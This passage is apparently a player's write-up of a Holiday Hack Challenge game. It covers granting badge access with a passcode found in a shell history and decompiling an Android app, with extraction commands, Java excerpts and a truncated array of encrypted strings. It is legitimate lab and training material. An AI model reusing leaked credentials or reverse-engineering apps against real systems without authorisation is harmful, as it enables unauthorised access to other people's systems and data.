```sh
history
```

Would you look at that! The history wasn't cleared for this. Someone already
created a card with the id of `143` with full permissions. The passcode
`CandyCaneCrunch77` seems like it could be used to setup the new badge for Jewel
Loggins.

```sh
    8  ping 1.1.1.1
    9  slh --help
   10  slg --config
   11  slh --passcode CandyCaneCrunch77 --set-access 1 --id 143
   12  df -h
   13  top
   14  ps aux | grep apache
```

I use the passcode I discovered to add a new card id of `42` with full
permissions. Let's see how we do.

I tip my hat to the Hitch Hikers Guide To The Galaxy reference.

```sh
slh --passcode CandyCaneCrunch77 --set-access 1 --id 42
```

Bingo! After setting the access to badge 42 we get a great display of ACII art 
in the terminal telling us that card 42 has been granted level 1 access.

```sh

       *   *   *   *   *   *   *   *   *   *   *
   *                                             *
*      ❄  ❄  ❄  ❄  ❄  ❄  ❄  ❄  ❄  ❄  ❄  ❄  ❄     *
 *  $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\  * 
  * $$  __$$\ $$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  __$$\ *
   *$$ /  $$ |$$ /  \__|$$ /  \__|$$ |      $$ /  \__|$$ /  \__| *
    $$$$$$$$ |$$ |      $$ |      $$$$$\    \$$$$$$\  \$$$$$$\   
   *$$  __$$ |$$ |      $$ |      $$  __|    \____$$\  \____$$\  *
  * $$ |  $$ |$$ |  $$\ $$ |  $$\ $$ |      $$\   $$ |$$\   $$ | *
*   $$ |  $$ |\$$$$$$  |\$$$$$$  |$$$$$$$$\ \$$$$$$  |\$$$$$$  |   *
 *  \__|  \__| \______/  \______/ \________| \______/  \______/  *
*         *    ❄             ❄           *        ❄    ❄    ❄   *
   *        *     *     *      *     *      *    *      *      *
   *  $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$$\ $$$$$$$\  $$\  *
   * $$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |\__$$  __|$$  _____|$$  __$$\ $$ | *
  *  $$ /  \__|$$ |  $$ |$$ /  $$ |$$$$\ $$ |   $$ |   $$ |      $$ |  $$ |$$ |*
  *  $$ |$$$$\ $$$$$$$  |$$$$$$$$ |$$ $$\$$ |   $$ |   $$$$$\    $$ |  $$ |$$ | *
 *   $$ |\_$$ |$$  __$$< $$  __$$ |$$ \$$$$ |   $$ |   $$  __|   $$ |  $$ |\__|*
  *  $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |   $$ |   $$ |      $$ |  $$ |   *
*    \$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |   $$ |   $$$$$$$$\ $$$$$$$  |$$\ *
 *    \______/ \__|  \__|\__|  \__|\__|  \__|   \__|   \________|\_______/ \__|  *
  *                                                            ❄    ❄    ❄   *
   *      *    *    *    *    *    *    *    *    *    *    *    *    *    *                                                                                                                                        

Card 42 granted access level 1.
```

With that done. Jewel Loggins new dialog for us related to us adding the badge 
id to the system.

> Wow! You're amazing at this! Clever move finding the password in the command 
> history. It’s a good reminder about keeping sensitive information secure…
>
> -- **Jewel Loggins (Front Yard (Act I))**

### Solution (Gold)

I have not completed this challenge yet.

## Act I: Conclusion

> This division among the elves can't be good. Surely it won't get any worse.

With at least the `Silver` challenges being completed. It looks like there is a
pretty suspencful outro for Act I.

# Act II

> Wombley's getting desparate. Out-elved by Alabaster's faction, he's planning a 
> gruesome snowball fight to take over present delivery!
>
> Piney, Chimney, and Eve each need your help.

Here is a map of Act II for future reference.

{{< image src="maps/frontyardact2.jpg" alt="Act II map of the front yard." position="center" style="width=100%; border-radius: 8px;" >}}

## Mobile Analysis

> I've been busy creating and testing a modern solution to Santa’s Naughty-Nice 
> List, and I even built an Android app to streamline things for Alabaster’s 
> team.
> 
> But here’s my tiny reindeer-sized problem: I made a 
> [debug](https://www.holidayhackchallenge.com/2024/SantaSwipe.apk) version 
> and a [release](https://www.holidayhackchallenge.com/2024/SantaSwipeSecure.aab) 
> version of the app.
> 
> I accidentally left out a child's name on each version, but for the life of 
> me, I can't remember who!
> 
> Could you start with the debug version first, figure out which child’s name 
> isn’t shown in the list within the app, then we can move on to release? I’d 
> be eternally grateful!
> 
> -- **Eve Snowshoes (Front Yard (Act II))**

### Solution (Silver)

So for this I decided to decompile the `SantaSwipe.apk` file using `jadx` and
`apktool` just to see what informaiton both would provide.

I like `jadx` usually because the output files are generally easier to read. I
use the command below to decompile `SantaSwipe.apk`.

```sh
jadx -d SantaSwipe SantaSwipe.apk
```

There isn't much output for this command. I've never used it before so the
errors count was concerning initially. But, after looking at the contents of the
`SantaSwipe` directory. It looks like there are files. So, it must be fine.

```sh
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 19
```

For apktool I had an issue with the AUR package. So I decided to decompile using
one of the containers. This will decompile the `SantaSwipe.apk` to a directory
named `SantaSwipe`. One thing I like about apktool is the amount of detail it
can provide. But, in this case I don't use it. Jadx gives me everything I need
for the silver challenge.

```sh
podman run --rm -v `pwd`:/app docker.io/theanam/apktool d SantaSwipe.apk
```

The apktool decompiles to `dex` files and some in the `Smali` format. Which
isn't always the easiest to read. But, in a pinch it will do.

```sh
I: Using Apktool 2.4.0 on SantaSwipe.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
S: WARNING: Could not write to (/root/.local/share/apktool/framework), using /tmp instead...
S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
I: Loading resource table from file: /tmp/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes4.dex...
I: Baksmaling classes2.dex...
I: Baksmaling classes3.dex...
I: Baksmaling classes5.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

Checked the `SantaSwipe` folder for any data that might be useful. I decided to
check for the word `naughty` using `ripgrep`. This didn't come up with a whole
lot of results. But, this was probably the best start.

```sh
rg naughty .
```

It looks like there is a database name called `naughtynicelist.db` in the the 
`DatabaseHelper.java` file. Courious if there is any data there that might be of
use.

```sh
./sources/com/northpole/santaswipe/DatabaseHelper.java
14:    private static final String DATABASE_NAME = "naughtynicelist.db";
```

Below is the contents of the `./sources/com/northpole/santaswipe/` folder. Looks
like there is the `DatabaseHelper.java`, `MainActivity.java`, etc. Which might
come in use down the road. `DatabaseHelper.java` probably has a lot of
informaiton on the database schema. The `MainActivity.java` file probably has
the main operation logic in the file. But, I'll need to read these to see.

```sh
total 56K
drwxr-xr-x 1 tloftus tloftus   88 Oct 31 23:38 .
drwxr-xr-x 1 tloftus tloftus   20 Oct 31 23:38 ..
-rw-r--r-- 1 tloftus tloftus 6.2K Oct 31 23:38 DatabaseHelper.java
-rw-r--r-- 1 tloftus tloftus  16K Oct 31 23:38 MainActivity.java
-rw-r--r-- 1 tloftus tloftus  31K Oct 31 23:38 R.java
drwxr-xr-x 1 tloftus tloftus   10 Oct 31 23:38 ui
```

I opened the file and there was function that seems to build the schema and
write some scaffolding for the web applications database. There are a bunch of
names that go into the `NormalList` tale. But, there isn't anything that looks
like it's going into the naughty or nice list.

```java
    public void onCreate(SQLiteDatabase db) {
        Intrinsics.checkNotNullParameter(db, "db");
        db.execSQL("CREATE TABLE IF NOT EXISTS NiceList (Item TEXT);");
        db.execSQL("CREATE TABLE IF NOT EXISTS NaughtyList (Item TEXT);");
        db.execSQL("CREATE TABLE IF NOT EXISTS NormalList (Item TEXT);");
        db.execSQL("DELETE FROM NiceList;");
        db.execSQL("DELETE FROM NaughtyList;");
        db.execSQL("DELETE FROM NormalList;");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Carlos, Madrid, Spain');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Aiko, Tokyo, Japan');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Maria, Rio de Janeiro, Brazil');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Liam, Dublin, Ireland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Emma, New York, USA');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Chen, Beijing, China');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Fatima, Casablanca, Morocco');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Hans, Berlin, Germany');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Olga, Moscow, Russia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ravi, Mumbai, India');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Amelia, Sydney, Australia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Juan, Buenos Aires, Argentina');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Sofia, Rome, Italy');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ahmed, Cairo, Egypt');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Yuna, Seoul, South Korea');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ellie, Alabama, USA');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Lucas, Paris, France');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Mia, Toronto, Canada');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Sara, Stockholm, Sweden');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ali, Tehran, Iran');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Nina, Lima, Peru');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Anna, Vienna, Austria');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Leo, Helsinki, Finland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Elena, Athens, Greece');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Davi, Sao Paulo, Brazil');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Marta, Warsaw, Poland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Noah, Zurich, Switzerland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ibrahim, Ankara, Turkey');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Emily, Wellington, New Zealand');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Omar, Oslo, Norway');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Fatou, Dakar, Senegal');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Olivia, Vancouver, Canada');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ethan, Cape Town, South Africa');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Santiago, Bogota, Colombia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Isabella, Barcelona, Spain');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ming, Shanghai, China');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Chloe, Singapore, Singapore');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Mohammed, Dubai, UAE');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ava, Melbourne, Australia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Luca, Milan, Italy');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Sakura, Kyoto, Japan');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Edward, New Jersey, USA');");
    }
```

So, I decide to look at the `MainActivity.java` file and I found the following
line. It's sending a SQLite query to the database for all `Items` except for
`Ellie`. So I have a hunch that this is the name we're looking for. 

```java
Cursor cursor = sQLiteDatabase.rawQuery("SELECT Item FROM NormalList WHERE Item NOT LIKE '%Ellie%'", null);
```

Below is the exerpt from the `MainActivity.java` file where I found the line
above. Thought I would include it in case it was any use down the road.

```java

        @JavascriptInterface
        public final void getNormalList() {
            final String jsonItems;
            try {
                SQLiteDatabase sQLiteDatabase = MainActivity.this.database;
                if (sQLiteDatabase == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("database");
                    sQLiteDatabase = null;
                }
                Cursor cursor = sQLiteDatabase.rawQuery("SELECT Item FROM NormalList WHERE Item NOT LIKE '%Ellie%'", null);
                List items = new ArrayList();
                Log.d("WebAppInterface", "Fetching items from NormalList table");
                while (cursor.moveToNext()) {
                    String item = cursor.getString(0);
                    Intrinsics.checkNotNull(item);
                    items.add(item);
                    Log.d("WebAppInterface", "Fetched item: " + item);
                }
                cursor.close();
                if (items.isEmpty()) {
                    jsonItems = "[]";
                } else {
                    jsonItems = CollectionsKt.joinToString$default(items, "\",\"", "[\"", "\"]", 0, null, null, 56, null);
                }
                MainActivity mainActivity = MainActivity.this;
                final MainActivity mainActivity2 = MainActivity.this;
                mainActivity.runOnUiThread(new Runnable() { // from class: com.northpole.santaswipe.MainActivity$WebAppInterface$$ExternalSyntheticLambda1
                    @Override // java.lang.Runnable
                    public final void run() {
                        MainActivity.WebAppInterface.getNormalList$lambda$0(jsonItems, mainActivity2);
                    }
                });
            } catch (Exception e) {
                Log.e("WebAppInterface", "Error fetching NormalList: " + e.getMessage());
            }
        }

```

In the submission box I entered `Ellie` and clicked submit. I got the
achievement. So now it's time to move on to the next step.

With that finished I talked to Eve Snowshoes and they provided the following
dialog.

> Aha! Success! You found it!
> 
> Thanks for staying on your toes and helping me out—every step forward keeps 
> Alabaster’s plans on track. You're a real lifesaver!
> 
> -- **Eve Snowshoes (Front Yard (Act II))**

### Solution (Gold)

It sounds like it only gets more difficult from here. We'll want to put in the
work for `release` version named `SantaSwipeSecure` that resides in that `.aab`
file. This hints that the data underneath is obfuscated. But, we shall see.

> Nice job completing the debug version—smooth as a sleigh ride on fresh snow!
> 
> But now, the real challenge lies in the obfuscated release version. Ready to 
> dig deeper and show Alabaster’s faction your skills?
>
> -- **Eve Snowshoes (Front Yard (Act II))**

**Hints:**

This hint talks about a new android app format for bundling apps. It also goes
over a gist by apk-sherlock that shows you how to convert an ```aab``` to an
```apk``` file.

> Mobile Analysis Hard - Format
> 
> From: Eve Snowshoes
>
> Objective: Mobile Analysis
>
> So yeah, have you heard about this new 
> [Android app](https://developer.android.com/guide/app-bundle/app-bundle-format) 
> format? Want to convert it to an 
> [APK file](https://github.com/HackJJ/apk-sherlock/blob/main/aab2apk.md)?

This hint discusses that data might be encrypted in the file. But, provides a
resources that discusses the string resources found in Android apps. This might
be helpful down the road for sure.

> Mobile Analysis Hard - Encryption and Obfuscation
> 
> From: Eve Snowshoes
> 
> Objective: Mobile Analysis
> 
> Obfuscated and encrypted? Hmph. Shame you can't just run 
> [strings](https://developer.android.com/guide/topics/resources/string-resource) 
> on the file.

Initially I check what kind of file I'm working with using the `file` command.

```sh
file SantaSwipeSecure.aab
```

Looks like this is a Zip archive. Which kind of makes sense. The application is
bundled together into the file. But, the other option here is the file(1)
command is wrong in this situation.

```sh
SantaSwipeSecure.aab: Zip archive data, at least v0.0 to extract, compression method=deflate
```

So, the `.aab` extension stands for Android App Bundle (AAB) format. This is the
file format Android developers use to upload their apps to the Google Play
Store. They're intended to be signed binaries that organize code similar to
APKs. Google Play in fact utilizes these files to generate multiple APK files
for your Android apps. Which are generally separated by `Base APK`,
`Configuration APK`, `Feature APKs`, and `Multi APK` files. Which all have their
own functionality.

If anyone would like to learn more about that. I've provided the link below.

- [Android App Bundle Format](https://developer.android.com/guide/app-bundle/app-bundle-format)

Decided to go through the guide provided for this chellenge. We'll see how well
I can follow directions.

- [apk-sherlock/aab2apk](https://github.com/HackJJ/apk-sherlock/blob/main/aab2apk.md)

I wanted to avoid installing `bundletool` initially because I didn't want to
have it on my system for long. The containers don't seem to work. Which I'll
need to revisit some day. They output a bunch of Perssion Denied messages for
the files probably because I'm not doing this in the right user context. But,
enough of that.

So I installed `bundletool` and ran the `build-apk` option. Targeted the bundle
and set the output for `SantaSwipeSecure.apks`. 

```sh
bundletool build-apks --bundle=SantaSwipeSecure.aab --output=SantaSwipeSecure.apks --mode=universal
```

Below is the output for running the command. It looks like it extracted
successfully.

```sh
WARNING: A terminally deprecated method in sun.misc.Unsafe has been called
WARNING: sun.misc.Unsafe::objectFieldOffset has been called by com.google.common.util.concurrent.AbstractFuture$UnsafeAtomicHelper (file:/usr/share/java/bundletool/bundletool.jar)
WARNING: Please consider reporting this to the maintainers of class com.google.common.util.concurrent.AbstractFuture$UnsafeAtomicHelper
WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release
WARNING: The APKs won't be signed and thus not installable unless you also pass a keystore via the flag --ks. See the command help for more information.
```

Next step is to change the file extension of the `SantaSwipeSecure.apks` to
`SantaSwipeSecure.zip`. An APKS file is an archive file that can contain
multiple APK files. Which is very similar to an APK file. I'm uncertain of the
compression APKS files can provide. But, I do know you can change the file
extension to `.zip`. So, I did.

```sh
mv SantaSwipeSecure.apks SantaSwipeSecure.zip
```

Look, the new `SantaSwipeSecure.zip` file ready for us to extract.

```sh
SantaSwipeSecure.aab  SantaSwipeSecure.zip
```

Used the `unzip(1)` command to unzip the file into a directory named
`SantaSecureSwipe`.

```sh
unzip SantaSwipeSecure.zip -d SantaSwipeSecure
```

Looks like it extracted a file named `toc.pb` and an APK named `universal.apk`.

```sh
Archive:  SantaSwipeSecure.zip
 extracting: SantaSwipeSecure/toc.pb
 extracting: SantaSwipeSecure/universal.apk
```

From here on out, I'll be working in the `SantaSwipeSecure` directory.

```sh
SantaSwipeSecure  SantaSwipeSecure.aab  SantaSwipeSecure.zip
```

I use `jadx` to decompile the `universal.apk` file into a folder I created named
`jadx`.

```sh
jadx -d jadx/ universal.apk
```

Below is the output for this. 

```sh
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 24
```

This can also be accomplished by running an `apktool` container with the `d`
flag on the `universal.apk`. This will decompile everything like `jadx`. Only
the file contents will be in the `Samli` format.

```sh
podman run --rm -v `pwd`:/app docker.io/theanam/apktool d universal.apk
```

Here is the output for this command. This was run in the `apktool` directory so
it wouldn't spill into the parent directory.

```sh
I: Using Apktool 2.4.0 on universal.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
S: WARNING: Could not write to (/root/.local/share/apktool/framework), using /tmp instead...
S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
I: Loading resource table from file: /tmp/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

Now that I have my files. I decided to look for something that might help me
move forward in finding one of the missing list item. I was looking through the
`./source/com/northpole/santaswipe/DatabaseHelper.java` file and I came across
what looks to e an encrypted query.

```java
    @Override // android.database.sqlite.SQLiteOpenHelper
    public void onCreate(SQLiteDatabase db) {
        Intrinsics.checkNotNullParameter(db, "db");
        db.execSQL("CREATE TABLE IF NOT EXISTS NiceList (Item TEXT);");
        db.execSQL("CREATE TABLE IF NOT EXISTS NaughtyList (Item TEXT);");
        db.execSQL("CREATE TABLE IF NOT EXISTS NormalList (Item TEXT);");
        db.execSQL(decryptData("IVrt+9Zct4oUePZeQqFwyhBix8cSCIxtsa+lJZkMNpNFBgoHeJlwp73l2oyEh1Y6AfqnfH7gcU9Yfov6u70cUA2/OwcxVt7Ubdn0UD2kImNsclEQ9M8PpnevBX3mXlW2QnH8+Q+SC7JaMUc9CIvxB2HYQG2JujQf6skpVaPAKGxfLqDj+2UyTAVLoeUlQjc18swZVtTQO7Zwe6sTCYlrw7GpFXCAuI6Ex29gfeVIeB7pK7M4kZGy3OIaFxfTdevCoTMwkoPvJuRupA6ybp36vmLLMXaAWsrDHRUbKfE6UKvGoC9d5vqmKeIO9elASuagxjBJ"));
        insertInitialData(db);
    }
```

If I look further it looks like the full list is encrypted as well in the
`insertInitialdata()` final method that creates the database and adds all of the
initial data to it. Not sure what I gain by dectypting all of these. But, I'll
keep the method here just in case.

```java
    private final void insertInitialData(SQLiteDatabase db) {
        Iterator it = CollectionsKt.listOf((Object[]) new String[]{"L2HD1a45w7EtSN41J7kx/hRgPwR8lDBg9qUicgz1qhRgSg==", "IWna1u1qu/4LUNVrbpd8riZ+w9oZNN1sPRS2ujQpMqAAt114Yw==", "MWfO0+M1t5IvQtN2ad9w3hp81sYQIIaX6veq03bnk6I4H/1n89gW", "LmHJ164506skXdh3K9MZ/BBiw90TRO2mD0Hp9Nuoxu4ghx5/WQ==", "J2XF2645xKciX9RgK9MR+wZ60NIbKIsOTRSHP0jkBJPaF0djlqbc", "LGfJ0q451qslWt14aZd8rjtr1ZMtJItIvrKk8RRQWh2U6bQSEdPga59XDQ==", "LWTBzOt4u/4KXt99aJ18riBgy8cSJcpvtrKnM4IEsMDr9AwtlSJW+S/jdoHvXA==", "I2HM3+w1t4opQ953c5x8rjZvzNITIEFFaMC3bP4bW/FptwSEIzo=", "K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==", "O33D06452K0nWtA1J7kx/hRgtZNzI71BDpxorJ6mxImw/A==", "L2na0+M1t58yWdR3dN9wyQdrx9ASZFBP13TAtgvjKYVFW9J6rA==", "KmnGya451bs0Xdh3K9MX6wdjw90OdugnqIwKHDmVzoF7PjkQJQ==", "IWDN1K451bsvW9h3YN9wzR1nzNLx7AaHK857pwQ3GlLQ2i+e", "I2XByK451L8vQ941J7Y39wV6pk1FpbJdc3QZRlpVuVIsjQ==", "JGnc0+94u/4FUMJ4ZZ8x4BZvjpM6LphLvL+vfIsRMj38FLu+GyCyUdPJ2g==", "I2TNwq452bsxEeh2dZh8riBd4zTtytJ89Bxu9NEok+aDWmI=", "J2TN1OM1t5MpQtJ2cN9w3AB90doWBr/HMmnvw088K+A8OYyeqg==", "Ln3L26452rcqUN81J7ok7xl32UJTvrQCKVSd6Z+tiX2Hmg==", "Lm3B1uM1t5wjWMNsc99wwhBsw90YLyjPYh2rLfMJ1C4VX2kQBpE=", "KGfG2/E1t40yXtJyb5w841ku8cQSJY9K1bwgTiInx6cYV5Ui/DM+sA==", "L23BlqJK/78oVtl4bt9wzR1nzNKBr23V1KlRgUeyT5PagT9r", "MWnFz+d1u/4EVMN3K9MD+Rx62NYFLYtKu34IoIzUoRVftPjhSrdCxro=", "LGnM0+M1t5UvVMc1J6Y7/BRnzNY2Zug0wYGSAMBLA1AcU9yx", "NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR", "I2Hb0uM1t5AnWMN2ZZp8rj5rzMoWa/+6xCGsNnHvb00IU4Fr3Q==", "JmnG0+d1u/4JQt12K9Me4Qd5w8o6jn3t2IdQwSuXYx7u//Cv", "I2bBzuM1t5MzXNN4bt9wxxtqy9JRetksUopAr2UrK5xAUHDW", "JmHN3e01t5MjSdh6aNMT5wF3jpM6JJJNvLOoRJgv4sLKLQau2YBLzokQ", "LmHG3uM1t50pQdR3b5I36xsigvcSL4dFrbfU9Cqvl5I/xLcz0XU03pLK", "I2bc1ew1t4gvVN93Zt9wzwB91sEeIIGZ9QAB6FA50LlDQiHup1s=", "MWna264537sqQth3bJp8rjNnzN8WL47gYBHKOnMA/05AZVXhUewu", "KGfa3ec1t5IvXNA1J6M1/ACz8Z0iiXnvwFsEg5jrkLGq", "JXrJ2ec1t5siWN97coE35lku8dAYNYZFsbi05FzIyksNODX0NjFqyvVn", "L2nc3+01t5wzVN92dNMR5wdr0Z9XAJhDurK0PoMIwB3/YInPpneEf/Q3blsrDg==", "J2XB1vs1t5ozU91wad9wxwdrztIZJQMfNE4DYwx1R7bg5c50NDQ=", "Jmne0+Y1t5QpWdB3aZYj7AB8xZ9XEoVRq7TgFosbO6NUOYiKnRWuNaKuxMtDzqVA7Q==", "LGfa26451rM1RdRrY5I9olVAx8cfJJhIvrKkJJm3opYYxGiM9SQhFp8qlek=", "MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==", "KWHFlqJK8rEzXZ05VJwl+h0u6dwFJIuDD8ONR42MoY7KFht/QJfy", "Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz", "LWXJyK451rMrUN81J7k//BFvzGO14j2tV1Au4CjIir5oH4s=", "L2na0+c1t44nQ9hqK9MW/BRgwdazin6FJqgBFVKkiYZE/Oku", "NmfFlqJa/7clUNZ2K9MF3TR3qVJdK8qDeVx+ZJ0MHnNU", "Km3E3+x4u/4WQ9B+cpZ8rjZ0x9AfYbhBr6miO4QKWNrxWDpCUMmjm7xYtCdc6A==", "I3rCz+w1t5ojXdlwK9MZ4BFnwzwsgLd0z5uSRxTqIB8aQs4=", "L2nazuM1t4knQ8J4cN9w3hpiw90TTjWQOk7MWqw/XG0TO0AeQA==", "MWHF1ew1t4QzQ9h6b99w3QJn1skSM4ZFsbgRVLExuZmptZSHE6Yrul/e", "I2bJlqJD9rk0VNM1J7Ai4RR6y9JIjLKEIfFIhBPBpLBEqomH", "MGnO2+d1u/4KWMJ7aJ18riVh0McCJotIhSM4dPg694vcV/24WexvGQ==", "LmHG3uM1t4wjSNpzZoU55Vku69ASLYtKu2L+bDaBlZjDIaGNeZhBJqA=", "L2HL0uN1u/4EQ9BtboA87wNvjpMkLYVSvrepNgEBI1AclZNI8gyCBYQG2eM=", "J37JlqJb4ronQdRqc99wxgBgxdIFOAlaPoAgk8c4iPDAzcEuNDE=", "LGHD1e54/vJmfNh3dJh8rjdrztIFNJmu2xg+J6QSEiIx6k9QIl+a", "KWDJ3utz9vJmddByZoF8riZrzNYQIIbM23+WAVV6B504yBF/YTdb", "O2fdyfF88fJmY9B7Zod8rjhh0NwUIoVxNH9I0bHcUbdrTrTpnIWL", "LmndyOM1t5IvXNA1J6M1/ADJIEAtaTSWOs3rUHGxE23v", "KH3J1K45xqsvRd41J7Yz+xRqzcGKc2ANFJm7yAP/iEAOkACn", "I2TBlqJN4rAvQp05U4Y+5wZnw7REbFTEsKKaYtEbT4D/BfA=", "I2TB1OM1t40pV9h4K9MS+xlpw8EeIHcUEuddwvPOGYIPlGbXuns=", "JmHF0/Zr/vJmZdNwa5oj51ku5dYYM41Nvhg6ySTDiTI5vv18a6J6y14=", "J2XF2+xs8rJqEf14YJwjolVAy9QSM4NFBawvI9LTb3YoXPhmLC/pDw==", "KH3E0+M1t4gvVN93Zt9wzwB91sEeIEtgVtuakzge6p44dqbJkEc=", "MGfK3/Btu/4BXdBqYJwnolVdwdwDLYtKu+LDoHra5pWd9cdD5y0f3Mo=", "I2bJyfZ45LcnHZFKZpo++lVex8cSM5lGqq6ne807J7NGCggtcc93Ohi+VKRgXDKpmdgI", "J2bS1a452r80QtRwa581olVI0NIZIo+b1vqa1HqNcwPKRRUCkA2e", "I2Hb0uM1t5QnWtBrc5J8rjxgxtwZJJlNvvHYzXGTBJ/ect8fCv2lmE4=", "L2nc3/dq7fJmesN4bJwnolVezd8WL47o08C8QCvrmNi28s6uzbkB", "MGfb2645378wUN94K9MT+xdvICDOUBRXAjmOpELQySokFQ==", "JmHN3e01t40nX8V2J7c/4xxgxdxbYa5LsrWuPo4IPOBnBhkbfJx6kuAQ5S2AHRJNPm+/JMsu2Y4=", "K3vJ2Od1u/4LUN9wa5J8riVmy98eMZpNsbmz/o7XqAaLAwARWkH6eIgkvg==", "JmnG0+d1u/4FUMN4ZJIjolVYx90SO59Bs72pxXLFYIQzfSavfBYeKvSp", "MWfO0+M1t40pV9h4K9MS+xlpw8EeIOWh30NfCMogzRbG9bbOpOQ=", "L33bzuN/9vJmcN9yZoExolVa18EcJJMyCPdCGbm3ITUv4dWqaqTJ", "JW3HyOV8u/4IUNhraJE5olVFx90OIIDivPFcm6m1iBokvOvJ6Jw=", "LmHG26451L8vQ941J7Y39wV6CD4JBxN6y16SruzezWKPkA==", "KGfb3645xL8oEft2dDD5olVNzcADIMp2tr+hjSygfMWJwjL2dFscDmwjjg==", "L2HJlqJN9rIqWN93K9MV/QFhzNoWqj9VHhFMZ8Go9BUGzcsDyA==", "J2TB2/E1t5YjXcJwaZg5olVIy90bIIRA/1z33GgMGZTTRJFra6XBzA==", "OGna26453q0qUNx4ZZI0olVew9geMp5FsXmupyWxdH/oy9rxaRJqUOA=", "I2zJ16451awnRdhqa5Im71ku8d8YN4tPtr1l2Twrd2VbP7DifnHx1H8R", "J2TB3K453q0yUN97cp98riF70NgSOCtbDxARU2xtlLgyGO7yaRU=", "Ln3LlqJb5as1QtR1dN9wzBBixdoCLK9D8qtP2JBdQm86rVaciwM=", "LmndyOM1t5MnVcNwY99w3QVvy916DDmwWl6gWeYjk2X3jVl2", "NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR", "I2TNwuN386wjHZFVcos14xdh18EQbcpoqqSlOo8GJ7JSkODr7+fBPtiGNds2i5nCLw==", "KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8=", "J2XF26451qslWt14aZd8rjtr1ZMtJItIvrKk5S9JSEZ8qKvgRP2Mvcy4eQ==", "Ln3Bya45xL8oRdh4YJx8rjZmy98Sl+3RcG/g8aeHWMyfJPImOg==", "IWnc0udr/rAjHZFWc4cx+RQigvAWL4tAvg5ALUCnxBG/cw3LfEmj4oA=", "NmfFeSNqu/4LXt9tYoU56hBhjpMiM59Dqr253YTDn38uXKJ5tl00FEINTg==", "I2bG26451LE2VN9xZpQ14Fku5tYZLItWtJEJuhXmygDg52L+RBvqJyA=", "Mm3c3/A1t5E1Xd41J70//AJv27+zexRjk1E0oOdUtHEChqA=", "KH3E0+M1t5wjQ91wad9wyRB8z9IZOJNUHr+RrQebnoaStFwY+6Y=", 